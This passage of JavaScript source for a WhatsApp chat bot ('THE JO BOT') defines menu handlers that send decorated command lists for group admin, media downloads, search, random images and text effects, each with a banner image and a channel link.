prefix+_0xa8f0ba(0x1fa)+prefix+_0xa8f0ba(0x171)+prefix+_0xa8f0ba(0x1d2)+prefix+_0xa8f0ba(0x1e5)+prefix+'3𝚍𝚜𝚌𝚒𝚏𝚒\x0a│➳\x20'+prefix+_0xa8f0ba(0x20f)+prefix+_0xa8f0ba(0x176)+prefix+_0xa8f0ba(0x23c)+prefix+_0xa8f0ba(0x198)+prefix+_0xa8f0ba(0x228)+prefix+'𝚜𝚙𝚊𝚌𝚎\x0a│➳\x20'+prefix+_0xa8f0ba(0x1b7)+prefix+_0xa8f0ba(0x199)+prefix+_0xa8f0ba(0x1a0)+prefix+'𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x1a7)+prefix+_0xa8f0ba(0x1c3)+prefix+'𝚖𝚊𝚐𝚖𝚊\x0a│➳\x20'+prefix+_0xa8f0ba(0x1bf)+prefix+_0xa8f0ba(0x214)+prefix+_0xa8f0ba(0x239)+prefix+'𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜\x0a│➳\x20'+prefix+_0xa8f0ba(0x1dc)+prefix+_0xa8f0ba(0x1ef)+prefix+_0xa8f0ba(0x1c8)+prefix+'𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x1f5)+prefix+'𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜\x0a│➳\x20'+prefix+'𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢\x0a│➳\x20'+prefix+_0xa8f0ba(0x1ea)+prefix+_0xa8f0ba(0x1eb)+prefix+_0xa8f0ba(0x234)+prefix+_0xa8f0ba(0x1f7)+prefix+_0xa8f0ba(0x1be)+prefix+_0xa8f0ba(0x226)+prefix+_0xa8f0ba(0x22c)+prefix+_0xa8f0ba(0x217)+prefix+_0xa8f0ba(0x21c)+prefix+_0xa8f0ba(0x208)+prefix+_0xa8f0ba(0x216)+prefix+'𝚌𝚘𝚏𝚏𝚎𝚌𝚞𝚙\x0a│➳\x20'+prefix+_0xa8f0ba(0x237)+prefix+_0xa8f0ba(0x1c6)+prefix+_0xa8f0ba(0x180)+prefix+_0xa8f0ba(0x222)+prefix+'𝚌𝚛𝚘𝚜𝚜𝚏𝚒𝚛𝚎\x0a│➳\x20'+prefix+'𝚐𝚊𝚕𝚊𝚡𝚢\x0a│➳\x20'+prefix+_0xa8f0ba(0x1da)+prefix+_0xa8f0ba(0x1ed)+prefix+'𝚋𝚎𝚊𝚌𝚑\x0a│➳\x20'+prefix+'𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔\x0a│➳\x20'+prefix+_0xa8f0ba(0x1b8)+prefix+'𝚢𝚝𝚌𝚎𝚛𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚎\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│\x20\x20\x20\x20〘\x20FUN\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20'+prefix+_0xa8f0ba(0x1c7)+prefix+_0xa8f0ba(0x203)+prefix+'𝚑𝚒𝚕𝚒𝚑\x0a│➳\x20'+prefix+_0xa8f0ba(0x1d7)+prefix+_0xa8f0ba(0x193)+prefix+_0xa8f0ba(0x215)+prefix+'𝚓𝚊𝚍𝚒𝚊𝚗\x0a│➳\x20'+prefix+'𝚓𝚘𝚍𝚘𝚑𝚔𝚞\x0a│➳\x20'+prefix+'𝚍𝚎𝚕𝚝𝚝𝚝\x0a│➳\x20'+prefix+_0xa8f0ba(0x173)+prefix+_0xa8f0ba(0x18f)+prefix+_0xa8f0ba(0x22b)+prefix+_0xa8f0ba(0x18e)+prefix+_0xa8f0ba(0x211)+prefix+'𝚗𝚘𝚖𝚘𝚛𝚑𝚘𝚔𝚒\x0a│➳\x20'+prefix+_0xa8f0ba(0x19b)+prefix+'𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊\x0a│➳\x20'+prefix+_0xa8f0ba(0x20e)+prefix+_0xa8f0ba(0x181)+prefix+_0xa8f0ba(0x1a3)+prefix+_0xa8f0ba(0x1ff)+prefix+_0xa8f0ba(0x1b6)+prefix+'𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗\x0a│➳\x20'+prefix+_0xa8f0ba(0x1b1)+prefix+_0xa8f0ba(0x1b0)+prefix+_0xa8f0ba(0x1e7)+prefix+_0xa8f0ba(0x1bd)+prefix+_0xa8f0ba(0x1ce)+prefix+_0xa8f0ba(0x1a4)+prefix+'𝚝𝚊𝚛𝚘𝚝\x0a│➳\x20'+prefix+_0xa8f0ba(0x1cd)+prefix+_0xa8f0ba(0x1f9)+prefix+'𝚑𝚊𝚛𝚒𝚜𝚊𝚗𝚐𝚊𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x206)+prefix+_0xa8f0ba(0x1de)+prefix+_0xa8f0ba(0x1ac)+prefix+_0xa8f0ba(0x218)+prefix+_0xa8f0ba(0x1af)+prefix+'𝚔𝚊𝚛𝚊𝚔𝚝𝚎𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x219)+prefix+_0xa8f0ba(0x19f)+prefix+_0xa8f0ba(0x1ad)+prefix+_0xa8f0ba(0x1b4)+prefix+_0xa8f0ba(0x1ee)+prefix+'𝚊𝚝𝚝𝚙\x0a│➳\x20'+prefix+_0xa8f0ba(0x19a)+prefix+'𝚝𝚘𝚒𝚖𝚊𝚐𝚎\x0a│➳\x20'+prefix+_0xa8f0ba(0x194)+prefix+'𝚜𝚝𝚒𝚌𝚔𝚎𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x190)+prefix+_0xa8f0ba(0x21d)+prefix+_0xa8f0ba(0x202)+prefix+_0xa8f0ba(0x1cc)+prefix+_0xa8f0ba(0x209)+prefix+_0xa8f0ba(0x1ab)+prefix+_0xa8f0ba(0x191)+prefix+_0xa8f0ba(0x19e)+prefix+_0xa8f0ba(0x1d5)+prefix+_0xa8f0ba(0x1bb)+prefix+_0xa8f0ba(0x1bc)+prefix+_0xa8f0ba(0x20d)+prefix+'𝚙𝚒𝚗𝚐\x0a│➳\x20'+prefix+_0xa8f0ba(0x177)+prefix+_0xa8f0ba(0x17d)+prefix+'𝚍𝚎𝚕𝚎𝚝𝚎\x0a│➳\x20'+prefix+'𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝\x0a│➳\x20'+prefix+'𝚚𝚞𝚘𝚝𝚎𝚍\x0a│➳\x20'+prefix+_0xa8f0ba(0x1b2)+prefix+_0xa8f0ba(0x179)+prefix+_0xa8f0ba(0x1e8)+prefix+'𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│〘\x20DATABASE\x20MENU\x20〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20'+prefix+_0xa8f0ba(0x1a2)+prefix+'𝚕𝚒𝚜𝚝𝚌𝚖𝚍\x0a│➳\x20'+prefix+'𝚍𝚎𝚕𝚌𝚖𝚍\x0a│➳\x20'+prefix+_0xa8f0ba(0x212)+prefix+_0xa8f0ba(0x23f)+prefix+_0xa8f0ba(0x1c1)+prefix+_0xa8f0ba(0x21e)+prefix+'𝚍𝚎𝚕𝚖𝚜𝚐\x0a╰━═════════════━•\x0a•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━•\x20\x0a╭━═════════════━•\x20\x0a│〘ANONYMOUS\x20MENU〙\x0a╰━═════════════━•\x20\x0a╭━═════════════━•\x0a│➳\x20'+prefix+_0xa8f0ba(0x17e)+prefix+_0xa8f0ba(0x22d)+prefix+_0xa8f0ba(0x1c9)+prefix+_0xa8f0ba(0x223)+prefix+'𝚒𝚚𝚛𝚊\x0a│➳\x20'+prefix+'𝚑𝚊𝚍𝚒𝚜𝚝\x0a│➳\x20'+prefix+'𝚊𝚕𝚚𝚞𝚛𝚊𝚗\x0a│➳\x20'+prefix+_0xa8f0ba(0x230)+prefix+_0xa8f0ba(0x17f)+prefix+_0xa8f0ba(0x22f)+prefix+_0xa8f0ba(0x1fc)+prefix+_0xa8f0ba(0x1f2)+prefix+'𝚎𝚊𝚛𝚛𝚊𝚙𝚎\x0a│➳\x20'+prefix+_0xa8f0ba(0x1d9)+prefix+_0xa8f0ba(0x184)+prefix+_0xa8f0ba(0x1d1)+prefix+_0xa8f0ba(0x189)+prefix+'𝚛𝚘𝚋𝚘𝚝\x0a│➳\x20'+prefix+_0xa8f0ba(0x231)+prefix+'𝚝𝚞𝚙𝚊𝚒\x0a│➳\x20'+prefix+_0xa8f0ba(0x1dd)+prefix+_0xa8f0ba(0x1fd)+prefix+'𝚌𝚑𝚊𝚝\x20[𝚘𝚙𝚝𝚒𝚘𝚗]\x0a│➳\x20'+prefix+'𝚓𝚘𝚒𝚗\x20[𝚕𝚒𝚗𝚔]\x0a│➳\x20'+prefix+_0xa8f0ba(0x17b)+prefix+_0xa8f0ba(0x1e3)+prefix+'𝚞𝚗𝚋𝚕𝚘𝚌𝚔\x20@𝚞𝚜𝚎𝚛\x0a│➳\x20'+prefix+_0xa8f0ba(0x201)+prefix+_0xa8f0ba(0x1f3)+prefix+'𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝\x20[𝚒𝚖𝚊𝚐𝚎]\x0a│➳\x20'+prefix+_0xa8f0ba(0x1d6)+prefix+_0xa8f0ba(0x233),jobotz[_0xa8f0ba(0x236)](m[_0xa8f0ba(0x200)],{'image':{'url':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'},'contextInfo':{'externalAdReply':{'title':'©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','body':'Runtime\x20'+runtime(process[_0xa8f0ba(0x1e2)]()),'previewType':_0xa8f0ba(0x18c),'showAdAttribution':!![],'sourceUrl':_0xa8f0ba(0x174),'thumbnailUrl':_0xa8f0ba(0x225)}},'caption':anu});}
}
break

 case 'groupmenu':  case 'grupmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 GROUP MENU 〙
│➳ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
│➳ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
│➳ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
│➳ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
│➳ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
│➳ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
│➳ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
│➳ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
│➳ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'webzonemenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘WEBZONE MENU〙
│➳ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
│➳ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
│➳ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
│➳ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
│➳ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
│➳ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
│➳ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
│➳ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'downloadmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•›〘DOWNLOAD MENU〙
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
│➳ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
│➳ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
│➳ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
│➳ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
│➳ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'searchmenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 SEARCH MENU 〙
│➳ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
│➳ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'randommenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 RANDOM MENU 〙
│➳ ${prefix}𝚌𝚘𝚏𝚏𝚎
│➳ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
│➳ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
│➳ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
│➳ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
│➳ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
│➳ ${prefix}𝚙𝚞𝚒𝚜𝚒
│➳ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
│➳ ${prefix}𝚊𝚗𝚒𝚖𝚎
│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞
│➳ ${prefix}𝚑𝚞𝚜𝚋𝚞
│➳ ${prefix}𝚗𝚎𝚔𝚘
│➳ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
│➳ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
│➳ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'tekspromenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
╰━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭━━•› 〘 TEKS PRO MENU 〙
│➳ ${prefix}3𝚍𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜
│➳ ${prefix}3𝚍𝚍𝚎𝚎𝚙𝚜𝚎𝚊
│➳ ${prefix}𝚊𝚖𝚎𝚛𝚒𝚌𝚊𝚗𝚏𝚕𝚊𝚐
│➳ ${prefix}3𝚍𝚜𝚌𝚒𝚏𝚒
│➳ ${prefix}3𝚍𝚛𝚊𝚒𝚗𝚋𝚘𝚠
│➳ ${prefix}3𝚍𝚠𝚊𝚝𝚎𝚛𝚙𝚒𝚙𝚎
│➳ ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗𝚜𝚔𝚎𝚕𝚎𝚝𝚘𝚗
│➳ ${prefix}𝚜𝚔𝚎𝚝𝚌𝚑
│➳ ${prefix}𝚋𝚕𝚞𝚎𝚌𝚒𝚛𝚌𝚞𝚒𝚝
│➳ ${prefix}𝚜𝚙𝚊𝚌𝚎
│➳ ${prefix}𝚖𝚎𝚝𝚊𝚕𝚕𝚒𝚌
│➳ ${prefix}𝚏𝚒𝚌𝚝𝚒𝚘𝚗
│➳ ${prefix}𝚐𝚛𝚎𝚎𝚗𝚑𝚘𝚛𝚛𝚘𝚛
│➳ ${prefix}𝚝𝚛𝚊𝚗𝚜𝚏𝚘𝚛𝚖𝚎𝚛
│➳ ${prefix}𝚋𝚎𝚛𝚛𝚢
│➳ ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
│➳ ${prefix}𝚖𝚊𝚐𝚖𝚊
│➳ ${prefix}3𝚍𝚌𝚛𝚊𝚌𝚔𝚎𝚍𝚜𝚝𝚘𝚗𝚎
│➳ ${prefix}3𝚍𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
│➳ ${prefix}𝚒𝚖𝚙𝚛𝚎𝚜𝚜𝚒𝚟𝚎𝚐𝚕𝚒𝚝𝚌𝚑
│➳ ${prefix}𝚗𝚊𝚝𝚞𝚛𝚊𝚕𝚕𝚎𝚊𝚟𝚎𝚜
│➳ ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
│➳ ${prefix}𝚖𝚊𝚝𝚛𝚒𝚡
│➳ ${prefix}𝚍𝚛𝚘𝚙𝚠𝚊𝚝𝚎𝚛
│➳ ${prefix}𝚑𝚊𝚛𝚛𝚢𝚙𝚘𝚝𝚝𝚎𝚛
│➳ ${prefix}𝚏𝚘𝚐𝚐𝚢𝚠𝚒𝚗𝚍𝚘𝚠
│➳ ${prefix}𝚗𝚎𝚘𝚗𝚍𝚎𝚟𝚒𝚕𝚜
│➳ ${prefix}𝚌𝚑𝚛𝚒𝚜𝚝𝚖𝚊𝚜𝚑𝚘𝚕𝚒𝚍𝚊𝚢
│➳ ${prefix}3𝚍𝚐𝚛𝚊𝚍𝚒𝚎𝚗𝚝
│➳ ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
│➳ ${prefix}𝚐𝚕𝚞𝚎𝚝𝚎𝚡𝚝
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬

© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
`
jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
"contextInfo": {
"externalAdReply": {
"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
"body":`Runtime ${runtime(process.uptime())}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
}}, caption: anu })
}
break

 case 'photooxymenu': {
 if (!isCreator && !isBan) return 
 anu = `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞MENU NYA ──➤ ↶↷
